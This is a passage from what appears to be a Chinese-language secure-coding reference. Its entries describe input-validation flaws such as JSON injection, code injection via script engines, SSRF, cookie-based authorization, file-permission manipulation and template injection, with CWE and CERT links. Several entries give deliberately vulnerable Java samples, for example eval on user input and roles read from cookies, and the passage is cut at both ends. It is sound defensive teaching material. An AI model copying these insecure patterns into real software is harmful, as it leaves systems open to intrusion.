        <span class="k">return</span><span class="o">;</span>
      <span class="o">}</span>
      <span class="n">is2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">file_path</span><span class="o">));</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">E</span><span class="o">)</span> <span class="o">{</span>
        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
      <span class="n">is1</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
      <span class="n">is2</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>该漏洞代码修复示例中，通过调用verify_file_path()函数，有效的验证了路径，可以预防路径遍历漏洞。</p>
<h1 id="_6">引用</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE23">
<p>http://cwe.mitre.org/data/definitions/23.html <a class="footnote-backref" href="#fnref-CWE23" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-CERT-FIO16-J">
<p>https://wiki.sei.cmu.edu/confluence/display/java/FIO16-J.+Canonicalize+path+names+before+validating+them <a class="footnote-backref" href="#fnref-CERT-FIO16-J" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
<li id="fn-CERT-FIO02-C">
<p>https://wiki.sei.cmu.edu/confluence/display/c/FIO02-C.+Canonicalize+path+names+originating+from+tainted+sources <a class="footnote-backref" href="#fnref-CERT-FIO02-C" title="Jump back to footnote 3 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/c.html">C++</a>
                <a href="../../../tag/java.html">Java</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1105">JSON注入</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>JSON是用作序列化对象、数组、数字、字符串、布尔值以及null值的一种语法，常被各类程序用来存储数据或发送消息。
例如，下面一段示例是JSON最简单的Key→Value示例（名称 / 值对，键值对）：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">{</span> <span class="s">"UserName"</span><span class="o">:</span> <span class="s">"xxser"</span><span class="p">,</span> <span class="s">"PassWord"</span><span class="o">:</span><span class="s">"nike"</span><span class="p">,</span> <span class="s">"email"</span><span class="o">:</span> <span class="s">"root@secbug.org"</span> <span class="p">}</span>
</pre></div>
</td></tr></table>
<p>在了解了基础的JSON知识后，下面来看JSON中的注入。
在JSON的基础知识中，我们了解到JSON是根据引号（"）、冒号(:)、逗号（,）和花括号（{}）区分各字符的意义的。如果有恶意用户向JSON中注入恶意字符，那么JSON将解析失败。例如，输入的PassWord值为：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">admin</span><span class="s">"888</span>
</pre></div>
</td></tr></table>
<p>那么组装成的JSON数据位如下：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="s">"PassWord"</span><span class="o">:</span><span class="s">" admin"</span><span class="mi">888</span><span class="s">"</span>
</pre></div>
</td></tr></table>
<p>在PassWord中的引号将会破坏整个JSON的结构，导致JSON解析失败。</p>
<h1 id="_2">漏洞与风险</h1>
<p>当程序使用不受信的用户输入来构建JSON文件时，攻击者可能会往其中注入任意的元素，注入的内容可能会引起解析器错误，甚至改变原JSON文件的结构。此外，JSON注入还可能引起代码执行、跨站脚本攻击等问题。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<p>1 对其关键字符进行转义。如：将</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="s">"admin"</span><span class="mi">888</span><span class="s">"</span>
</pre></div>
</td></tr></table>
<p>转换为
<code>c
"admin\"888"</code>c
这样JSON的值就可以解析了。如果字符串中出现"\"，同样需要将其转义为"\"。
2 使用一些第三方组件。以Java为例，使用了JSON-lib.jar组建JSON数据，可以有效地避免JSON注入。</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1078">设置操纵</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
</ul>
</li>
<li><a href="#_7">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>一项或多项系统设置、配置元素存在被用户控制的危险。</p>
<h1 id="_2">漏洞与风险</h1>
<p>当系统设置能够被外部控制时，服务将面临停机的风险，程序也可能会表现出异常的行为，且很可能是恶意的异常行为。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<ul>
<li>将系统分区，划清界限，明确划分出安全区域。</li>
<li>正常情况下，不要允许用户输入或其他不可信的数据去控制敏感的数据值。</li>
</ul>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>以下的Java代码片段展示了从<code>HttpServletRequest</code>中读取一字符串并将它设置为一个数据库连接的活动目录：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">conn</span><span class="o">.</span><span class="na">setCatalog</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"catalog"</span><span class="o">));</span>
</pre></div>
</td></tr></table>
<p>在以上的例子中，攻击者可以提供一个不存在的活动目录以造成错误，或连接到一个没有访问授权的数据库区域。</p>
<h1 id="_7">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/15.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1080">动态代码执行</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
<li><a href="#_7">漏洞代码修复示例</a></li>
</ul>
</li>
<li><a href="#_8">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>代码注入是形容某类攻击的术语，这种攻击类型包含注入能够被应用程序解释、运行的代码。通常情况下，这样的攻击类型都是利用程序对不受信数据处理极差这一点来实现的。</p>
<h1 id="_2">漏洞与风险</h1>
<p>当不受信的输入被用作动态构建代码时，将有可能出现代码注入攻击。一个显而易见的漏洞之源是从Java代码中使用JavaScript。<code>javax.script</code>包含有定义Java脚本引擎的接口和类，以及一个支持这些接口和类的使用的框架。因此，如果不小心误用了这个包的API，攻击者将能在目标系统上执行任意的代码。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<p>在解释不受信的代码时，你应该格外小心。</p>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>这段缺陷代码展示了将不受信的用户输入用于构造一条打印相应输入信息的JavaScript语句：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">evalScript</span><span class="o">(</span><span class="n">String</span> <span class="n">firstName</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ScriptException</span> <span class="o">{</span>
  <span class="n">ScriptEngineManager</span> <span class="n">manager</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ScriptEngineManager</span><span class="o">();</span>
  <span class="n">ScriptEngine</span> <span class="n">engine</span> <span class="o">=</span> <span class="n">manager</span><span class="o">.</span><span class="na">getEngineByName</span><span class="o">(</span><span class="s">"javascript"</span><span class="o">);</span>
  <span class="n">engine</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="s">"print('"</span><span class="o">+</span> <span class="n">firstName</span> <span class="o">+</span> <span class="s">"')"</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="_7">漏洞代码修复示例</h3>
<p>防御代码注入的最好办法是在代码中避免包含用户输入中的可执行内容。例如，用于动态构造代码的用户输入应该先进行清洗，以保证清洗后的数据中只包含有效的、白名单中允许的字符：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">evalScript</span><span class="o">(</span><span class="n">String</span> <span class="n">firstName</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ScriptException</span> <span class="o">{</span>
  <span class="c1">// Allow only alphanumeric and underscore chars in firstName</span>
  <span class="c1">// (modify if firstName may also include special characters)</span>
  <span class="k">if</span> <span class="o">(!</span><span class="n">firstName</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="s">"[\\w]*"</span><span class="o">))</span> <span class="o">{</span>
    <span class="c1">// String does not match whitelisted characters</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">();</span>
  <span class="o">}</span>

  <span class="n">ScriptEngineManager</span> <span class="n">manager</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ScriptEngineManager</span><span class="o">();</span>
  <span class="n">ScriptEngine</span> <span class="n">engine</span> <span class="o">=</span> <span class="n">manager</span><span class="o">.</span><span class="na">getEngineByName</span><span class="o">(</span><span class="s">"javascript"</span><span class="o">);</span>
  <span class="n">engine</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="s">"print('"</span><span class="o">+</span> <span class="n">firstName</span> <span class="o">+</span> <span class="s">"')"</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="_8">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/IDS52-J.+Prevent+code+injection <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1077">服务器端请求伪造</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>Web服务器从上游设备中接收到了一个URL或类似的请求，未验证请求是否确实是发送给本服务器就从中提取出请求内容。</p>
<h1 id="_2">漏洞与风险</h1>
<p>通过给预期之外的主机或端口发送URL，攻击者能使服务器误以为发送请求的是它自己本身，从而越过像防火墙这类阻止攻击值直接访问URL的访问控制。服务器进而能被攻击者当做一个代理，对主机内部网络进行端口扫描；或利用别的URL来访问系统中的文件，如<code>file://</code>；或利用如<code>gopher://</code>或<code>tftp://</code>之类的协议，来获取远高于请求内容之上的控制权。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<p>实现一个用作远程资源获取的合法的域名、协议白名单。</p>
<h1 id="_5">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/918.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0092">在安全决策中依赖不可信输入</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">缓解与预防</a></li>
<li><a href="#_4">漏洞利用威胁</a></li>
<li><a href="#_5">演示示例</a><ul>
<li><a href="#1">漏洞代码示例 1</a></li>
<li><a href="#2">漏洞代码示例 2</a></li>
</ul>
</li>
<li><a href="#_6">引用</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>开发人员可能会认为cookie，环境变量和隐藏表单字段等输入无法修改。但是，攻击者可以使用自定义客户端或其他攻击来更改这些输入。此更改可能无法被检测到。 当安全机制，比如认证和授权，是基于这些输入时，攻击者可以绕过软件的安全机制。
没有足够的加密，完整性检查或其他机制，来自外部人的任何输入都不可信。</p>
<h1 id="_2">漏洞与风险</h1>
<p>攻击者可以绕过安全机制访问任何受保护的内容。后果将取决于相关的功能，但是它们的威胁范围从不受信任的用户的权限授予到绕过重要的安全检查。最终，这种漏洞可能导致暴露或修改敏感数据，系统崩溃或执行任意代码。</p>
<h1 id="_3">缓解与预防</h1>
<ol>
<li>仅在服务器端存储状态信息和敏感数据。</li>
<li>任何在客户端执行的安全检查，都需要确保在服务器端重新检查。攻击者可以通过修改结果来绕过客户端的安全检查，或者更改客户端完全删除客户端安全检查。然后，这些修改后的结果将被提交给服务器。</li>
<li>了解不可信输入可能进入软件的所有潜在领域：程序参数，cookie，从网络读取的任何内容，环境变量，反向DNS查询，查询结果，请求标头，URL组件，电子邮件，文件，文件名，数据库以及向应用程序提供数据的任何外部系统。请记住，这样的输入可能通过API调用间接获得。</li>
</ol>
<p>严重用于安全决策的所有输入，并确定是否可以修改设计，从而不依赖提交的输入。例如，您可能能够在服务器端保留有关用户会话的关键信息，而不是将其记录在外部数据中。</p>
<h1 id="_4">漏洞利用威胁</h1>
<p>严重</p>
<h1 id="_5">演示示例</h1>
<h3 id="1">漏洞代码示例 1</h3>
<p>从浏览器cookie读取值以确定用户的角色。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">Cookie</span><span class="o">[]</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getCookies</span><span class="o">();</span>
<span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span> <span class="n">cookies</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
  <span class="n">Cookie</span> <span class="n">c</span> <span class="o">=</span> <span class="n">cookies</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"role"</span><span class="o">))</span> <span class="o">{</span>
    <span class="n">userRole</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="2">漏洞代码示例 2</h3>
<p>从浏览器cookie读取认证标志，从而允许外部控制用户状态数据。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">Cookie</span><span class="o">[]</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getCookies</span><span class="o">();</span>
<span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span> <span class="n">cookies</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
  <span class="n">Cookie</span> <span class="n">c</span> <span class="o">=</span> <span class="n">cookies</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"authenticated"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> 
  <span class="n">Boolean</span><span class="o">.</span><span class="na">TRUE</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">getValue</span><span class="o">()))</span> <span class="o">{</span>
    <span class="n">authenticated</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>修复建议：参考“缓解与预防”</p>
<h1 id="_6">引用</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE807">
<p>http://cwe.mitre.org/data/definitions/807.html <a class="footnote-backref" href="#fnref-CWE807" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP-A1">
<p>https://www.owasp.org/index.php/Top_10-2017_A1-Injection <a class="footnote-backref" href="#fnref-OWASP-A1" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/c.html">C++</a>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/cwe-807.html">CWE-807</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1082">操纵文件权限</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
<li><a href="#_7">代码修复示例</a></li>
</ul>
</li>
<li><a href="#_8">引用</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>当文件在比实际所需的更大的用户范围内提供权限设置后，可能导致敏感信息暴露，或对该资源的意外地修改。当文件与程序配置、敏感的用户数据有关时，这尤其危险。</p>
<h1 id="_2">漏洞与风险</h1>
<p>敏感信息泄露或程序配置错误</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<p>严格控制文件权限</p>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Example</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setPermissionsByInputFile</span><span class="o">(</span><span class="n">Path</span> <span class="n">path</span><span class="o">,</span> <span class="n">File</span> <span class="n">inputFile</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">(</span><span class="n">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">FileReader</span><span class="o">(</span><span class="n">inputFile</span><span class="o">)))</span> <span class="o">{</span>
            <span class="n">Files</span><span class="o">.</span><span class="na">setPosixFilePermissions</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="n">PosixFilePermissions</span><span class="o">.</span><span class="na">fromString</span><span class="o">(</span><span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">()));</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>从文件中读取字符串来设置文件权限，可能导致文件权限失控</p>
<h3 id="_7">代码修复示例</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">testgood</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">test</span><span class="o">(</span><span class="n">Path</span> <span class="n">path</span><span class="o">,</span> <span class="n">File</span> <span class="n">file</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">(</span><span class="n">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">FileReader</span><span class="o">(</span><span class="n">file</span><span class="o">)))</span> <span class="o">{</span>
            <span class="n">Files</span><span class="o">.</span><span class="na">setPosixFilePermissions</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="n">parsePermission</span><span class="o">(</span><span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">()));</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>通过<code>parsePermission</code>函数来验证来自输入字符串的权限设置</p>
<h1 id="_8">引用</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE732">
<p>https://cwe.mitre.org/data/definitions/732.html <a class="footnote-backref" href="#fnref-CWE732" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP-A5">
<p>https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control <a class="footnote-backref" href="#fnref-OWASP-A5" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/cpp.html">CPP</a>
                <a href="../../../tag/java.html">Java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1098">服务器端模板注入</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>为了在网页或邮件中呈现动态数据，Web应用广泛使用模板引擎。</p>
<h1 id="_2">漏洞与风险</h1>
<p>当没有恰当地对模板中的用户输入数据进行验证时，将有可能出现服务器端模板注入攻击，这是一种严重的缺陷，且很可能会被当做跨站脚本攻击，或者说完完全全就没有被察觉。与跨站脚本攻击不同，模板注入可以直接地攻击服务器的内部结构，且常常能找到远程代码执行的机会，将每个存在缺陷的程序转变成潜在的支点。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<ul>
<li>使用一个简单的模板引擎。</li>
<li>将模板引擎沙箱化，限制在相对安全的Docker容器中。</li>
</ul>
<h1 id="_5">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-blackhat">
<p>https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf <a class="footnote-backref" href="#fnref-blackhat" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1071">拒绝服务</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a><ul>
<li><a href="#dos">通过耗尽资源而引起的DoS</a></li>
<li><a href="#dos_1">并发相关的DoS问题</a></li>
</ul>
</li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
<li><a href="#_7">漏洞代码修复示例</a></li>
</ul>
</li>
<li><a href="#_8">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>DoS攻击试图使得服务器无法提供计算资源或无法提供足够的计算资源给潜在的使用者。分布式的DoS攻击（DDoS）由两个或以上的人或机器展开。相比桌面程序，DoS和DDoS的攻击常以服务器类型的系统为对象。不管怎样，各式各样的应用程序都有可能受DoS之害。</p>
<p>引发DoS的途径有多种：
- 攻击者利用目标机器上已有的弱点，通过给目标机器发送少量精心制作的网络包从而引起DoS。
